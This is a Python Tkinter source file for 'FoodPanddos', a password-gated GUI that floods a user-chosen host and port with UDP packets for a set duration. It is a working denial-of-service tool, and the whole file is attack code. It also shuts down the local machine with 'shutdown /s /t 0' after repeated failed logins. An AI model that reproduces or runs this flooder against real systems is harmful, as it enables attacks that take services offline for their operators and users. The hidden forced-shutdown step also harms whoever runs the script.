import tkinter as tk
import socket
import random
import threading
import datetime
import os

# Creating the Tkinter window
window = tk.Tk()
window.title("FoodPanddos")
window.geometry("400x250")
window.resizable(False, False)

# Creating a frame for the title
title_frame = tk.Frame(window)
title_frame.pack(pady=10)

# Loading the image
icon_image = tk.PhotoImage(file="D:/foodpanda.png")

# Setting the icon
window.iconphoto(True, icon_image)

# Creating a title label
title_label = tk.Label(title_frame, text="FoodPanddos", font=("Arial", 16, "bold"))
title_label.pack()

# Creating a slogan
small_text_label = tk.Label(window, text="Now with express Delivery ;)", font=("Arial", 8))
small_text_label.pack()

# User Authentication
def authenticate(password):
    return password == "aswdfzxcbvbhgtyyn"

def login():
    password = password_entry.get()
    if authenticate(password):
        window.geometry("650x635")  # Change window geometry
        login_frame.pack_forget()  # Hide the login frame
        controls_frame.pack()  # Show the attack controls frame
        info_frame.pack()  # Show the attack info frame
        verify_frame.pack()  # Show the target verification frame
        window.resizable(False, False)
    else:
        login_status.config(text="Invalid password. Try again.")
        warnings_text = warning_counter["text"]
        warnings = int(warnings_text.split(":")[1].strip())
        warning_counter.config(text=f"Warnings: {warnings+1}")
        if warnings >= 3:
            window.destroy()
            os.system("shutdown /s /t 0")

# Creating a frame for the login screen
login_frame = tk.Frame(window)

# Creating a label and entry field for the password
password_label = tk.Label(login_frame, text="Password:", font=("Arial", 12))
password_label.pack()
password_entry = tk.Entry(login_frame, width=20, font=("Arial", 12), show="*")
password_entry.pack(pady=5)

# Creating a login button
login_button = tk.Button(login_frame, text="Login", command=login, font=("Arial", 12), bg="green", fg="white", padx=10, pady=5)
login_button.pack()

# Creating a label for login status
login_status = tk.Label(login_frame, text="", font=("Arial", 12))
login_status.pack()

# Creating a warning counter label
warning_counter = tk.Label(login_frame, text="Warnings: 0", font=("Arial", 12))
warning_counter.pack()

login_frame.pack(pady=10)

def generate_payload(payload_type):
    if payload_type == "Random":
        payload = generate_random_payload()
    else:
        payload = generate_severe_payload(payload_type)
    return payload


def generate_random_payload():
    payload = bytearray(random.getrandbits(8) for _ in range(1024))
    return payload

def generate_severe_payload(payload_type):
    payload = bytearray(payload_type, "utf-8") * 1024
    return payload

def start_attack():
    target = target_entry.get()
    # Extracting the IP address from the input
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        ip = target

    # Verify target's availability before launching the attack
    try:
        if port_entry.get() != '':
            socket.create_connection((ip, int(port_entry.get())))
    except ConnectionRefusedError:
        print("Connection refused. Target is not available.")
        return

    # Function to launch the attack
    def attack():
        # Configure attack parameters
        target_port = int(port_entry.get()) if port_entry.get() != '' else 80
        attack_duration = int(duration_entry.get()) if duration_entry.get() != '' else 0  # Added validation check

        # Check if attack duration is valid
        if attack_duration <= 0:
            print("Invalid attack duration. Please enter a positive value.")
            return

        payload_type = payload_dropdown.get()
        payload = generate_payload(payload_dropdown.get())

        # Initialize attack statistics
        total_packets_sent = 0
        start_time = datetime.datetime.now()

        # Create a socket for the attack
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Launch the attack for the specified duration
        while (datetime.datetime.now() - start_time).seconds < attack_duration:
            try:
                attack_socket.sendto(payload, (ip, target_port))
                total_packets_sent += 1
            except socket.error as e:
                print("Error sending packet:", str(e))
                break

        # Close the attack socket
        attack_socket.close()

        # Calculate attack duration
        end_time = datetime.datetime.now()
        attack_duration = (end_time - start_time).seconds

        # Calculate packets per second
        packets_per_second = total_packets_sent // attack_duration if attack_duration > 0 else 0

        # Display attack statistics
        packets_sent_label.config(text="Packets Sent: " + str(total_packets_sent))
        attack_duration_label.config(text="Attack Duration: " + str(attack_duration) + " seconds")
        packets_per_second_label.config(text="Packets per Second: " + str(packets_per_second))

    # Create and start a thread for the attack
    attack_thread = threading.Thread(target=attack)
    attack_thread.start()


# Creating a frame for the attack controls
controls_frame = tk.Frame(window)

# Creating a label and entry field for the target IP/URL
target_label = tk.Label(controls_frame, text="Target:", font=("Arial", 12))
target_label.pack()
target_entry = tk.Entry(controls_frame, width=20, font=("Arial", 12))
target_entry.pack(pady=5)

# Creating a label and entry field for the target port
port_label = tk.Label(controls_frame, text="Port:", font=("Arial", 12))
port_label.pack()
port_entry = tk.Entry(controls_frame, width=10, font=("Arial", 12))
port_entry.pack(pady=5)

# Creating a label and entry field for the attack duration
duration_label = tk.Label(controls_frame, text="Duration (seconds):", font=("Arial", 12))
duration_label.pack()
duration_entry = tk.Entry(controls_frame, width=10, font=("Arial", 12))
duration_entry.pack(pady=5)

# Creating a dropdown for payload type selection
payload_label = tk.Label(controls_frame, text="Payload Type:", font=("Arial", 12))
payload_label.pack()
payload_options = ["Random", "Custom"]
payload_dropdown = tk.StringVar(controls_frame)
payload_dropdown.set(payload_options[0])
payload_menu = tk.OptionMenu(controls_frame, payload_dropdown, *payload_options)
payload_menu.pack(pady=5)

# Creating a start button to initiate the attack
start_button = tk.Button(controls_frame, text="Start Attack", command=start_attack, font=("Arial", 12), bg="red", fg="white", padx=10, pady=5)
start_button.pack()

controls_frame.pack(pady=10)

# Creating a frame for the attack info
info_frame = tk.Frame(window)

# Creating labels to display attack statistics
packets_sent_label = tk.Label(info_frame, text="Packets Sent: 0", font=("Arial", 12))
packets_sent_label.pack()

attack_duration_label = tk.Label(info_frame, text="Attack Duration: 0 seconds", font=("Arial", 12))
attack_duration_label.pack()
packets_per_second_label = tk.Label(info_frame, text="Packets per Second: 0", font=("Arial", 12))
packets_per_second_label.pack()

info_frame.pack(pady=10)

# Creating a frame for target verification
verify_frame = tk.Frame(window)

# Creating a label and entry field for target verification
verify_label = tk.Label(verify_frame, text="Target Verification:", font=("Arial", 12))
verify_label.pack()
verify_entry = tk.Entry(verify_frame, width=20, font=("Arial", 12))
verify_entry.pack(pady=5)

# Creating a verify button to check target availability
def verify_target():
    target = verify_entry.get()
    try:
        ip = socket.gethostbyname(target)
        verify_status.config(text=f"Target: {target}\nIP: {ip}\nStatus: Available")
    except socket.gaierror:
        verify_status.config(text=f"Target: {target}\nStatus: Unavailable")

verify_button = tk.Button(verify_frame, text="Verify", command=verify_target, font=("Arial", 12), bg="blue", fg="white", padx=10, pady=5)
verify_button.pack()

# Creating a label for target verification status
verify_status = tk.Label(verify_frame, text="", font=("Arial", 12))
verify_status.pack()

verify_frame.pack(pady=10)

# Run the Tkinter event loop
window.mainloop()